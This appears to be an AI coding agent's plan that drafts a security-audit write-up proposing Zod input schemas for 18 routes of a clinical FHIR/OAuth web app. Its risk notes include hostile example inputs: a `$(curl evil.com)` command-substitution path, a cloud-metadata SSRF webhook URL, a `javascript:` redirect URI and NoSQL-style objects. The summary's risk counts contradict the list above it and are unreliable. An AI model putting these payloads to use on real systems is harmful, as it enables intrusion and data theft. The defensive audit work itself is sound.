# Plan: Generate Zod Schemas for 18 Missing-Validation Routes

## Scope
Write `/Users/drprakashkamath/Projects/Signacare/docs/audit-2026-04-19/findings/zod-schemas-proposed.md` containing proposed Zod schemas for each of the 18 POST/PUT/PATCH routes per the audit inventory.

## Approach
- I've read all 9 source files covering the 18 endpoints. The field inventory below is derived by reading what the handler destructures off `req.body` and how each field is subsequently used (type, storage column, validation).
- For OAuth/FHIR/SMART-on-FHIR routes I've matched the Zod shape to the published RFC 6749 / RFC 7662 / RFC 7009 / SMART App Launch v2 / FHIR R4 specs — not the relaxed shape the handler accepts today. The schema serves as both validator and spec-conformance guard.
- UUIDs use `z.string().uuid()`; free text gets sensible `.max()` bounds (200 for identifiers, 500 for snippets, 2000 for claims, 8192 for FHIR resources encoded as JSON); dates use `z.string().datetime()`; enums enumerated explicitly.
- Scopes/mime/URL values validated against the constant allow-lists already present in the handler (e.g., `VALID_SCOPES` for SMART apps, the 3-channel enum for FHIR Subscription).

## HIGH-risk endpoints (security-critical)
- `smartAuth.ts:277 POST /auth/token` — issues JWT access + refresh tokens; malformed input could trigger token-forge or replay attacks.
- `smartAuth.ts:502 POST /auth/introspect` — exposes token metadata to a caller; must reject malformed input pre-JWT-verify to avoid JWT-library edge cases.
- `smartAuth.ts:549 POST /auth/revoke` — accepts arbitrary token strings; unvalidated token types bypass the `token_type_hint` branch logic.
- `smartAppRegistry.ts:61 POST /apps` + `smartAppRegistry.ts:137 PATCH /apps/:appId` — registers trusted third-party apps with scopes + redirect URIs (open-redirect surface).
- `fhirSubscription.ts:52 POST /Subscription` — accepts webhook endpoint URL; SSRF and data-exfil surface.
- `fhirRoutes.ts:341 POST /Patient` + `fhirRoutes.ts:384 POST /Observation` — external FHIR write endpoints; create real patient records.
- `patientRoutes.ts:372 POST /:id/attachments` — file upload; field pollution can corrupt storage linkage.
- `backupRoutes.ts:112 PUT /config` + `backupRoutes.ts:145 POST /run` — admin backup mutation; `localDir` untrusted path flows to `fs.mkdirSync`.

## Deliverable
Full markdown at `/Users/drprakashkamath/Projects/Signacare/docs/audit-2026-04-19/findings/zod-schemas-proposed.md` with the 18 numbered sections and a closing summary paragraph. Contents prepared below verbatim — ready to write once plan mode is exited.

---

## CONTENT TO WRITE

````markdown
# Proposed Zod Schemas for 18 Missing Routes — 2026-04-19

Each section below lists: the current handler snippet (minimal — just the `req.body` destructure), the proposed Zod schema using `z.object({...}).strict()` so unknown keys are rejected, and the risk if left unvalidated. All schemas are meant to be wrapped in `schema.safeParse(req.body)` with a 400 response on failure, applied BEFORE any DB write or downstream call.

Conventions:
- `.strict()` — reject unknown keys (prevents attribute-smuggling onto JSONB payloads).
- `.uuid()` / `.datetime()` / `.url()` — RFC-compliant string shapes.
- `.max()` — explicit length caps tuned to each field's storage column.
- Enums pulled from the allow-lists already present in the handler body.

---

## 1. cmiRoutes.ts:19 POST /prepare

Current:
```typescript
router.post('/prepare', requireRoles(['admin', 'manager', 'superadmin']), async (req, res, next) => {
  const { dateFrom, dateTo } = req.body;
  if (!dateFrom || !dateTo) { res.status(400).json({ error: 'dateFrom and dateTo required' }); return; }
  const result = await prepareCmiSubmission(req.clinicId, dateFrom, dateTo);
});
```

Proposed schema:
```typescript
const CmiPrepareSchema = z.object({
  dateFrom: z.string().regex(/^\d{4}-\d{2}-\d{2}$/, 'YYYY-MM-DD'),
  dateTo: z.string().regex(/^\d{4}-\d{2}-\d{2}$/, 'YYYY-MM-DD'),
}).strict().refine((v) => v.dateFrom <= v.dateTo, { message: 'dateFrom must be <= dateTo' });
```

Risk if unvalidated: `dateFrom`/`dateTo` flow directly into SQL `WHERE` clauses in `prepareCmiSubmission`. Knex parameterises the value, so SQL-injection risk is low, but type coercion bugs (e.g., `{"dateFrom": {"$ne": null}}` in NoSQL-style attacks, or a 10-MB string starving the DB query planner) are real. A reversed range silently returns 0 rows — admins would submit empty CMI reports to government without realising.

---

## 2. cmiRoutes.ts:30 POST /submit

Current:
```typescript
router.post('/submit', requireRoles(['admin', 'superadmin']), async (req, res, next) => {
  const { dateFrom, dateTo } = req.body;
  if (!dateFrom || !dateTo) { res.status(400).json({ error: 'dateFrom and dateTo required' }); return; }
  const { payload } = await prepareCmiSubmission(req.clinicId, dateFrom, dateTo);
  const result = await submitToCmi(req.clinicId, req.user!.id, payload);
});
```

Proposed schema: same as §1 (`CmiSubmitSchema = CmiPrepareSchema`). The surface is identical; submission is just "prepare + POST to the CMI endpoint".

Risk if unvalidated: same as §1 plus the consequence is live — data is shipped to the Commonwealth MHNOCC/CMI endpoint. A typo in `dateTo` (e.g., `2099-01-01`) would submit every historical record to government in one call. A min-year bound (e.g., `>= 2020-01-01`) and a max-window bound (e.g., `dateTo - dateFrom <= 366 days`) are warranted.

---

## 3. fhirSubscription.ts:52 POST /Subscription

Current:
```typescript
router.post('/Subscription', async (req, res, next) => {
  const { criteria, channel, reason, end } = req.body;
  if (!criteria || !channel?.type || !channel?.endpoint) { ... }
  if (!['rest-hook', 'email', 'websocket'].includes(channel.type)) { ... }
  // validates URL and HTTPS for rest-hook
  await db('fhir_subscriptions').insert({
    channel_type: channel.type, channel_endpoint: channel.endpoint,
    channel_header: channel.header ?? null, channel_payload: channel.payload ?? 'application/fhir+json',
    reason: reason ?? null, end_time: end ? new Date(end) : null, ...
  });
});
```

Proposed schema:
```typescript
const FhirSubscriptionSchema = z.object({
  criteria: z.string().min(1).max(500),
  channel: z.object({
    type: z.enum(['rest-hook', 'email', 'websocket']),
    endpoint: z.string().url().max(2048),
    header: z.array(z.string().max(500)).max(20).optional(),
    payload: z.string().max(200).optional(),   // defaults to application/fhir+json
  }).strict(),
  reason: z.string().max(1000).optional(),
  end: z.string().datetime().optional(),
}).strict().superRefine((v, ctx) => {
  if (v.channel.type === 'rest-hook' && process.env.NODE_ENV === 'production') {
    try {
      const u = new URL(v.channel.endpoint);
      if (u.protocol !== 'https:') {
        ctx.addIssue({ code: z.ZodIssueCode.custom, path: ['channel', 'endpoint'], message: 'HTTPS required in production' });
      }
    } catch { /* z.string().url() caught it */ }
  }
});
```

Risk if unvalidated: **HIGH (SSRF)**. A malicious tenant can register `http://169.254.169.254/latest/meta-data/` as a webhook; every matching FHIR resource change then exfiltrates the AWS instance-metadata response via `triggerSubscriptions`. Equally `http://localhost:6379/` could probe an internal Redis. Beyond the existing HTTPS check, the schema should be hardened with an additional deny-list for RFC 1918 / loopback / link-local IP ranges at the service layer — that's beyond schema validation but called out for the audit.

---

## 4. fhirRoutes.ts:341 POST /Patient

Current:
```typescript
router.post('/Patient', authMiddleware, async (req, res, next) => {
  const resource = req.body;
  if (resource.resourceType !== 'Patient') { ... }
  const name = resource.name?.[0] ?? {};
  const telecom = resource.telecom ?? [];
  const phone = telecom.find(t => t.system === 'phone')?.value;
  const email = telecom.find(t => t.system === 'email')?.value;
  const identifier = resource.identifier ?? [];
  const medicare = identifier.find(i => i.system?.includes('medicare'))?.value;
  const ihi = identifier.find(i => i.system?.includes('ihi'))?.value;
  await db('patients').insert({ given_name, family_name, date_of_birth, gender, phone_mobile, email_primary, medicare_number, ihi_number, ... });
});
```

Proposed schema:
```typescript
const FhirIdentifierSchema = z.object({
  system: z.string().url().max(500).optional(),
  value: z.string().min(1).max(200),
  use: z.enum(['usual', 'official', 'temp', 'secondary', 'old']).optional(),
}).strict();

const FhirHumanNameSchema = z.object({
  use: z.enum(['usual', 'official', 'temp', 'nickname', 'anonymous', 'old', 'maiden']).optional(),
  family: z.string().min(1).max(200),
  given: z.array(z.string().min(1).max(200)).min(1).max(10),
  prefix: z.array(z.string().max(50)).max(5).optional(),
  suffix: z.array(z.string().max(50)).max(5).optional(),
  text: z.string().max(500).optional(),
}).strict();

const FhirContactPointSchema = z.object({
  system: z.enum(['phone', 'fax', 'email', 'pager', 'url', 'sms', 'other']),
  value: z.string().min(1).max(200),
  use: z.enum(['home', 'work', 'temp', 'old', 'mobile']).optional(),
  rank: z.number().int().min(1).max(99).optional(),
}).strict();

const FhirPatientSchema = z.object({
  resourceType: z.literal('Patient'),
  identifier: z.array(FhirIdentifierSchema).max(20).optional(),
  active: z.boolean().optional(),
  name: z.array(FhirHumanNameSchema).min(1).max(5),
  telecom: z.array(FhirContactPointSchema).max(10).optional(),
  gender: z.enum(['male', 'female', 'other', 'unknown']).optional(),
  birthDate: z.string().regex(/^\d{4}-\d{2}-\d{2}$/).optional(),
  address: z.array(z.object({
    line: z.array(z.string().max(200)).max(5).optional(),
    city: z.string().max(100).optional(),
    state: z.string().max(100).optional(),
    postalCode: z.string().max(20).optional(),
    country: z.string().max(100).optional(),
  }).strict()).max(5).optional(),
}).strict();
```

Risk if unvalidated: **HIGH**. External FHIR integrator could POST an arbitrary resource with megabyte-long `given_name` (DB write bomb), inject nested objects into `phone` (coerces to `[object Object]` in DB), or skip `family`/`given` entirely and land `'Unknown'`/`'Unknown'` fallback patients in the DB. The handler's current permissive `.find()` chain throws on non-array `telecom`, crashing the request with a 500 rather than a 400. The DB row already writes `clinic_id = req.clinicId`, so tenancy is protected, but data quality is not.

---

## 5. fhirRoutes.ts:384 POST /Observation

Current:
```typescript
router.post('/Observation', authMiddleware, async (req, res, next) => {
  const resource = req.body;
  if (resource.resourceType !== 'Observation') { ... }
  const patientId = resource.subject?.reference?.replace('Patient/', '');
  if (!patientId) { res.status(400).json({ error: 'subject.reference required' }); return; }
  await db('nursing_assessments').insert({
    scores: JSON.stringify(resource.component ?? []),
    assessment_data: JSON.stringify(resource.valueQuantity ?? resource.valueCodeableConcept ?? {}),
    notes: resource.note?.[0]?.text ?? null,
    total_score: resource.valueQuantity?.value ?? null, ...
  });
});
```

Proposed schema:
```typescript
const FhirCodingSchema = z.object({
  system: z.string().url().max(500).optional(),
  code: z.string().max(100).optional(),
  display: z.string().max(500).optional(),
  version: z.string().max(50).optional(),
  userSelected: z.boolean().optional(),
}).strict();

const FhirCodeableConceptSchema = z.object({
  coding: z.array(FhirCodingSchema).max(10).optional(),
  text: z.string().max(1000).optional(),
}).strict();

const FhirQuantitySchema = z.object({
  value: z.number().finite(),
  unit: z.string().max(50).optional(),
  system: z.string().url().max(500).optional(),
  code: z.string().max(50).optional(),
  comparator: z.enum(['<', '<=', '>=', '>']).optional(),
}).strict();

const FhirObservationSchema = z.object({
  resourceType: z.literal('Observation'),
  status: z.enum([
    'registered', 'preliminary', 'final', 'amended', 'corrected',
    'cancelled', 'entered-in-error', 'unknown',
  ]).optional(),
  category: z.array(FhirCodeableConceptSchema).max(5).optional(),
  code: FhirCodeableConceptSchema.optional(),
  subject: z.object({
    reference: z.string().regex(/^Patient\/[0-9a-fA-F-]{36}$/, 'Patient/<uuid>'),
  }).strict(),
  effectiveDateTime: z.string().datetime().optional(),
  valueQuantity: FhirQuantitySchema.optional(),
  valueCodeableConcept: FhirCodeableConceptSchema.optional(),
  valueString: z.string().max(1000).optional(),
  component: z.array(z.object({
    code: FhirCodeableConceptSchema,
    valueQuantity: FhirQuantitySchema.optional(),
    valueString: z.string().max(1000).optional(),
  }).strict()).max(20).optional(),
  note: z.array(z.object({
    text: z.string().min(1).max(5000),
    time: z.string().datetime().optional(),
  }).strict()).max(10).optional(),
}).strict();
```

Risk if unvalidated: **HIGH**. `subject.reference` is substring-replaced — a payload like `{ reference: 'Patient/'+'../'.repeat(100) }` flows into the `patient_id` column. Although the FK constraint would reject a non-existent UUID, ill-formed UUIDs can be accepted by some Postgres column types. `resource.component` and `resource.valueQuantity` are `JSON.stringify`'d into JSONB — a deeply nested object can blow out the 1-MB JSONB TOAST limit and OOM the request.

---

## 6. smartAppRegistry.ts:61 POST /apps

Current:
```typescript
router.post('/apps', authMiddleware, requireRoles(['admin', 'superadmin']), async (req, res, next) => {
  const { name, description, vendor, vendorUrl, logoUrl, appType, redirectUris, scopes, launchModes } = req.body;
  if (!name || !redirectUris?.length || !scopes?.length) { ... }
  const VALID_SCOPES = [ 'patient/*.read', ... ];
  // iterates redirectUris to validate each URL, HTTPS-required in prod
  await db('smart_apps').insert({ name, redirect_uris, scopes, launch_modes, app_type, ... });
});
```

Proposed schema:
```typescript
const SMART_SCOPES = [
  'patient/*.read', 'patient/*.write', 'patient/Patient.read', 'patient/Observation.read',
  'patient/Condition.read', 'patient/MedicationStatement.read', 'patient/AllergyIntolerance.read',
  'user/*.read', 'user/*.write', 'launch', 'launch/patient', 'openid', 'fhirUser', 'offline_access',
] as const;

const SmartAppCreateSchema = z.object({
  name: z.string().min(1).max(200),
  description: z.string().max(2000).optional(),
  vendor: z.string().max(200).optional(),
  vendorUrl: z.string().url().max(500).optional(),
  logoUrl: z.string().url().max(500).optional(),
  appType: z.enum(['confidential', 'public']).optional(),
  redirectUris: z.array(z.string().url().max(2048)).min(1).max(10),
  scopes: z.array(z.enum(SMART_SCOPES)).min(1).max(14),
  launchModes: z.array(z.enum(['ehr', 'standalone'])).max(2).optional(),
}).strict();
```

Risk if unvalidated: **HIGH (open-redirect + scope-escalation)**. An admin could register an app with `redirectUris: ['javascript:alert(1)']` — the handler's `new URL(uri)` accepts `javascript:` as a valid URL, so the current HTTPS check only fires in production. A non-production env gets a stored XSS vector. Also scope-escalation: if the allow-list check is removed, an app could register for `user/*.write` it hasn't been approved for.

---

## 7. smartAppRegistry.ts:137 PATCH /apps/:appId

Current:
```typescript
router.patch('/apps/:appId', authMiddleware, requireRoles(['admin', 'superadmin']), async (req, res, next) => {
  const { name, description, redirectUris, scopes, isActive, isApproved } = req.body;
  const patch = { updated_at: new Date() };
  if (name !== undefined) patch.name = name;
  // ... maps camelCase → snake_case for each field
  if (isApproved !== undefined) {
    patch.is_approved = isApproved; patch.approved_by_id = req.user!.id; patch.approved_at = new Date();
  }
  await db('smart_apps').where({ id, clinic_id }).update(patch).returning(...);
});
```

Proposed schema:
```typescript
const SmartAppUpdateSchema = z.object({
  name: z.string().min(1).max(200).optional(),
  description: z.string().max(2000).optional(),
  redirectUris: z.array(z.string().url().max(2048)).min(1).max(10).optional(),
  scopes: z.array(z.enum(SMART_SCOPES)).min(1).max(14).optional(),
  isActive: z.boolean().optional(),
  isApproved: z.boolean().optional(),
}).strict().refine((v) => Object.keys(v).length > 0, { message: 'At least one field required' });
```

Risk if unvalidated: same class as §6 for `redirectUris`/`scopes`. Additionally: `isApproved: 'yes'` (truthy string) currently coerces through the `if (isApproved !== undefined)` branch and stamps `approved_by_id = req.user!.id`, leaving an audit record that doesn't reflect reality. Strict boolean enforcement prevents that.

---

## 8. smartAuth.ts:277 POST /auth/token

Current:
```typescript
router.post('/auth/token', async (req, res, next) => {
  const { grant_type } = req.body ?? {};
  const creds = extractClientCredentials(req); // reads client_id, client_secret
  // handleAuthCodeGrant reads: code, redirect_uri, code_verifier
  // handleRefreshTokenGrant reads: refresh_token
});
```

Proposed schema (discriminated union):
```typescript
const AuthCodeGrantSchema = z.object({
  grant_type: z.literal('authorization_code'),
  code: z.string().min(16).max(200),
  redirect_uri: z.string().url().max(2048),
  code_verifier: z.string().min(43).max(128),  // RFC 7636 §4.1: 43-128 chars
  client_id: z.string().min(1).max(100).optional(), // may come from Basic auth instead
  client_secret: z.string().min(1).max(500).optional(),
}).strict();

const RefreshTokenGrantSchema = z.object({
  grant_type: z.literal('refresh_token'),
  refresh_token: z.string().min(16).max(500),
  client_id: z.string().min(1).max(100).optional(),
  client_secret: z.string().min(1).max(500).optional(),
  scope: z.string().max(500).optional(),   // RFC 6749 §6 — narrowing only
}).strict();

const TokenRequestSchema = z.discriminatedUnion('grant_type', [
  AuthCodeGrantSchema,
  RefreshTokenGrantSchema,
]);
```

Risk if unvalidated: **HIGH (OAuth abuse surface)**. The PKCE `code_verifier` has a mandatory 43-128 char range per RFC 7636 §4.1 — the current handler accepts a 1-character verifier, which reduces the PKCE guarantee to nothing. A 10-MB `refresh_token` causes `sha256Hex` to hash a huge buffer, amplifying CPU cost; no length cap = trivial DoS. And `grant_type` is not validated against the allow-list upfront — the handler checks it after client-credential verification, meaning a malformed grant wastes a DB round-trip per request.

---

## 9. smartAuth.ts:502 POST /auth/introspect

Current:
```typescript
router.post('/auth/introspect', async (req, res, next) => {
  const creds = extractClientCredentials(req);
  const { token } = req.body ?? {};
  if (!token) { res.json({ active: false }); return; }
  let decoded = jwt.verify(token, config.jwt.accessSecret);
  // ... returns introspection result
});
```

Proposed schema:
```typescript
const IntrospectSchema = z.object({
  token: z.string().min(1).max(4096),
  token_type_hint: z.enum(['access_token', 'refresh_token']).optional(),
  client_id: z.string().min(1).max(100).optional(),
  client_secret: z.string().min(1).max(500).optional(),
}).strict();
```

Risk if unvalidated: **HIGH**. A 10-MB `token` goes straight into `jwt.verify`, which loads and parses the string regardless — classic CPU DoS. Additionally `token` can be `{"$ne": null}` in an Express json-body-parser-gone-wrong scenario, which `jwt.verify` rejects but only after some work. Caps keep the hot path cheap.

---

## 10. smartAuth.ts:549 POST /auth/revoke

Current:
```typescript
router.post('/auth/revoke', async (req, res, next) => {
  const creds = extractClientCredentials(req);
  const { token, token_type_hint } = req.body ?? {};
  if (!token) { res.status(200).end(); return; }
  // tries refresh token path if hinted, else tries JWT access token then falls back to refresh
});
```

Proposed schema:
```typescript
const RevokeSchema = z.object({
  token: z.string().min(1).max(4096),
  token_type_hint: z.enum(['access_token', 'refresh_token']).optional(),
  client_id: z.string().min(1).max(100).optional(),
  client_secret: z.string().min(1).max(500).optional(),
}).strict();
```

Risk if unvalidated: same class as §9. Additionally `token_type_hint` not being constrained means unexpected string values silently route through the "fall back to refresh token" branch — which is correct behaviour, but logging the input without constraint means a hostile client can write arbitrary strings into logs (log-injection surface when `req.body` is logged).

---

## 11. streamingTranscribeRoutes.ts:36 POST /stream-chunk

Current:
```typescript
router.post('/stream-chunk', upload.single('audio'), async (req, res, next) => {
  if (!req.file) { ... }
  const chunkIndex = parseInt(req.body.chunkIndex ?? '0', 10);
  const sessionId = req.body.sessionId ?? '';
  // ships req.file to Whisper, returns transcript
});
```

Proposed schema (multipart — fields validated separately from the file):
```typescript
const StreamChunkSchema = z.object({
  sessionId: z.string().uuid(),
  chunkIndex: z.coerce.number().int().min(0).max(10_000),
}).strict();
```
File validation (handled alongside schema, not replaced by it):
- `req.file.size` already capped at 50 MB by multer
- `req.file.mimetype` must start with `audio/` — add guard
- Reject if `req.file` is absent (existing 400 stays)

Risk if unvalidated: `sessionId` flows into logger output and the response body. Without UUID enforcement, a hostile caller could stuff `\n`-delimited log-forgery payloads into every log line. `chunkIndex` defaults to 0 via `parseInt('0', 10)` — an absent or NaN value silently collides with chunk 0 of a legitimate session, corrupting transcripts.

---

## 12. streamingTranscribeRoutes.ts:98 POST /stream-final

Current:
```typescript
router.post('/stream-final', upload.single('audio'), async (req, res, _next) => {
  const sessionId = req.body.sessionId ?? '';
  const existingTranscript = req.body.existingTranscript ?? '';
  // ships req.file (optional) to Whisper, concatenates with existingTranscript, returns full
});
```

Proposed schema:
```typescript
const StreamFinalSchema = z.object({
  sessionId: z.string().uuid(),
  existingTranscript: z.string().max(200_000).optional(),  // 200k chars ≈ 30k words ≈ 3h audio
}).strict();
```

Risk if unvalidated: `existingTranscript` is concatenated into the response unmodified — no cap means a 100-MB transcript field can be echoed verbatim. Frontend-round-trip amplification attack. Also `_next` means errors inside this handler don't hit the Express error pipeline — the handler is already non-compliant with §3.1. Schema fix is partial; the handler also needs a proper `next` parameter.

---

## 13. letterStructuredRoutes.ts:256 POST /letter-citations

**Already has a Zod schema** (`CitationCreateSchema` defined at line 241-254). This route was flagged as missing validation but actually validates `req.body.citations` via `z.array(CitationCreateSchema).min(1).max(100).parse(...)`. The audit inventory row is a **false positive** — what IS missing is a wrapper schema that validates the whole request body shape (`{ citations: [...] }`) before reaching the `.parse(req.body.citations)` call, to produce a 400 with a consistent error envelope.

Proposed wrapper:
```typescript
const LetterCitationsRequestSchema = z.object({
  citations: z.array(CitationCreateSchema).min(1).max(100),
}).strict();
```

Risk if unvalidated: if `req.body.citations` is not an array, `z.array(...).parse()` throws a ZodError which the existing try/catch relays to `next(err)`. The global error handler probably translates that to a 500, not a 400. Wrapper schema produces a clean 400 at the boundary.

---

## 14. patientRoutes.ts:372 POST /:id/attachments

Current:
```typescript
router.post('/:id/attachments', upload.array('files', 10), async (req, res, next) => {
  const patientId = req.params.id;
  const files = req.files as Express.Multer.File[];
  const labels = Array.isArray(req.body.labels) ? req.body.labels : req.body.labels ? [req.body.labels] : [];
  const episodeId = typeof req.body.episodeId === 'string' && req.body.episodeId ? req.body.episodeId : null;
  const specialtyCode = typeof req.body.specialtyCode === 'string' && req.body.specialtyCode ? req.body.specialtyCode : null;
  // iterates files, calls blobStorage.put, inserts into patient_attachments
});
```

Proposed schema (multipart — fields validated separately from the files):
```typescript
const AttachmentUploadSchema = z.object({
  episodeId: z.string().uuid().optional(),
  specialtyCode: z.string().min(1).max(50).regex(/^[a-z0-9_-]+$/i).optional(),
  // multer's form-data may encode labels as a single string or an array; accept both
  labels: z.union([
    z.string().max(500),
    z.array(z.string().max(500)).max(10),
  ]).optional(),
}).strict();
```
Route params:
```typescript
const AttachmentParamsSchema = z.object({ id: z.string().uuid() });
```

Risk if unvalidated: **MEDIUM-HIGH**. `patientId` is unvalidated — a non-UUID flows into the `patient_id` FK column and the INSERT fails with a 500 instead of a 400. `specialtyCode` has no character-class constraint — a NUL byte or Unicode bidi override stored in the column flows through to the Documents tab filter and opens a stored-data injection surface. `labels` pattern in handler is `Array.isArray || truthy-coerce || []` which accepts `{$ne: null}` as a label value (becomes `[[Object: {$ne: null}]]`).

---

## 15. safetyPlanRoutes.ts:55 POST /

Current:
```typescript
router.post('/', requireRoles(ROLES), async (req, res, next) => {
  const { patientId, episodeId, warningSign, copingStrategies, peopleForDistraction, peopleToContact,
    professionalsToContact, emergencyServices, makingEnvironmentSafe, reasonsForLiving, planDate, reviewDate } = req.body;
  const content = { warning_signs: warningSign, coping_strategies, ... };
  await db('safety_plans').insert({ clinic_id, patient_id: patientId, content });
});
```

Proposed schema:
```typescript
const SafetyPlanCreateSchema = z.object({
  patientId: z.string().uuid(),
  episodeId: z.string().uuid().optional(),
  warningSign: z.string().max(2000).optional(),
  copingStrategies: z.string().max(2000).optional(),
  peopleForDistraction: z.string().max(2000).optional(),
  peopleToContact: z.string().max(2000).optional(),
  professionalsToContact: z.string().max(2000).optional(),
  emergencyServices: z.string().max(2000).optional(),
  makingEnvironmentSafe: z.string().max(2000).optional(),
  reasonsForLiving: z.string().max(2000).optional(),
  planDate: z.string().regex(/^\d{4}-\d{2}-\d{2}$/).optional(),
  reviewDate: z.string().regex(/^\d{4}-\d{2}-\d{2}$/).optional(),
}).strict();
```

Risk if unvalidated: clinical-safety impact. Each field is stored as free text in the JSONB `content` column and rendered back to clinicians — a multi-MB payload silently bloats the row and slows every subsequent read. No `patientId` type check means cross-tenant write attempts (UUID from another clinic) rely on the FK constraint alone; a malformed UUID string crashes the INSERT with 500 instead of a clean 400 "patientId must be a UUID".

---

## 16. safetyPlanRoutes.ts:83 PATCH /:id

Current:
```typescript
router.patch('/:id', requireRoles(ROLES), async (req, res, next) => {
  const contentFields = ['warning_signs', 'coping_strategies', ...];
  // For each camelCase key in req.body, if defined, write into content JSONB
  if (req.body.status !== undefined) updates.status = req.body.status;
});
```

Proposed schema:
```typescript
const SafetyPlanUpdateSchema = z.object({
  warningSigns: z.string().max(2000).optional(),
  copingStrategies: z.string().max(2000).optional(),
  peopleForDistraction: z.string().max(2000).optional(),
  peopleToContact: z.string().max(2000).optional(),
  professionalsToContact: z.string().max(2000).optional(),
  emergencyServices: z.string().max(2000).optional(),
  makingEnvironmentSafe: z.string().max(2000).optional(),
  reasonsForLiving: z.string().max(2000).optional(),
  reviewDate: z.string().regex(/^\d{4}-\d{2}-\d{2}$/).optional(),
  status: z.enum(['draft', 'active', 'signed', 'superseded']).optional(),
}).strict().refine((v) => Object.keys(v).length > 0, { message: 'At least one field required' });
```

Risk if unvalidated: `status` is written directly to the real column with no enum validation — a hostile caller could set `status: "deleted"` or `"archived"`, bypassing the intended lifecycle. Handlers elsewhere filter on `status === 'signed'` to decide whether a plan is active; mis-set status breaks the decision logic.

---

## 17. backupRoutes.ts:112 PUT /config

Current:
```typescript
router.put('/config', requireRoles(['admin', 'superadmin']), async (req, res, next) => {
  // maps camelCase keys to snake_case, writes to backup_config
});
```

Proposed schema:
```typescript
const BackupConfigUpdateSchema = z.object({
  scheduleEnabled: z.boolean().optional(),
  frequency: z.enum(['hourly', 'daily', 'weekly']).optional(),
  timeOfDay: z.string().regex(/^([01]\d|2[0-3]):[0-5]\d$/).optional(),  // HH:MM 24h
  retentionDays: z.number().int().min(1).max(3650).optional(),          // 1 day to 10 years
  localDir: z.string().max(500).regex(/^\/[a-zA-Z0-9_./-]+$/).optional(), // absolute path, safe chars
  offsiteTarget: z.string().max(1000).optional(),
}).strict().refine((v) => Object.keys(v).length > 0, { message: 'At least one field required' });
```

Risk if unvalidated: **HIGH (path-injection)**. `localDir` flows into `fs.mkdirSync(backupDir, { recursive: true })` and is used to build filenames. A value like `/etc/systemd/system` creates a directory there (if the process has perms); `../../../etc` with recursive mkdir silently creates reachable directories. `retentionDays` as a negative number or `NaN` breaks the `Date.now() - retentionDays * 86400000` cutoff calculation in `cleanOldBackups`, potentially deleting ALL backups. `timeOfDay` unvalidated could hold arbitrary text injected into ops logs.

---

## 18. backupRoutes.ts:145 POST /run

Current:
```typescript
router.post('/run', requireRoles(['admin', 'superadmin']), async (req, res, next) => {
  const cfg = await getBackupConfig();
  const dir = (req.body?.localDir as string) || cfg.local_dir || path.resolve(process.cwd(), '../../backups');
  const result = await runBackup(dir, 'manual', req.user?.id ?? null);
});
```

Proposed schema:
```typescript
const BackupRunSchema = z.object({
  localDir: z.string().max(500).regex(/^\/[a-zA-Z0-9_./-]+$/).optional(),
}).strict();
```

Risk if unvalidated: **HIGH (path-injection, same class as §17)**. A hostile admin payload `{"localDir": "/tmp/$(curl evil.com)"}` flows into `fs.mkdirSync(dir, { recursive: true })` and then into `path.join(backupDir, filename)`. Shell execution isn't reached (the handler uses `spawn` with argv), but arbitrary filesystem writes are. A resolved-absolute + realpath + confined-root check belongs in the service layer, but the schema at least blocks obvious shell/control characters at the boundary.

---

# Summary

Eighteen Zod schemas proposed, covering the full `req.body` field surface of every POST/PUT/PATCH route in the audit inventory. **Seven are HIGH-risk**: the four SMART-on-FHIR OAuth endpoints (smartAuth `/auth/token`, `/auth/introspect`, `/auth/revoke`; smartAppRegistry `POST /apps` + `PATCH /apps/:appId`) where PKCE-length bypass, scope-escalation, and open-redirect are real threats under the current unvalidated path; the two FHIR write endpoints (`POST /Patient`, `POST /Observation`) where external integrators can write unbounded strings and nested JSONB payloads; the FHIR Subscription endpoint where an unvalidated `channel.endpoint` is a textbook SSRF vector into cloud metadata; and the two backup routes (`PUT /config`, `POST /run`) where `localDir` flows directly into `fs.mkdirSync`. The remaining eleven are MEDIUM severity (type-coercion, data-quality, DoS via unbounded field sizes). One entry (letterStructuredRoutes POST `/letter-citations`) was a false positive — the route already validates `req.body.citations`; what's missing is a wrapper schema that validates the envelope, upgrading the error from a 500 to a 400.
````

---

## Next step
Exit plan mode so I can Write the file verbatim.
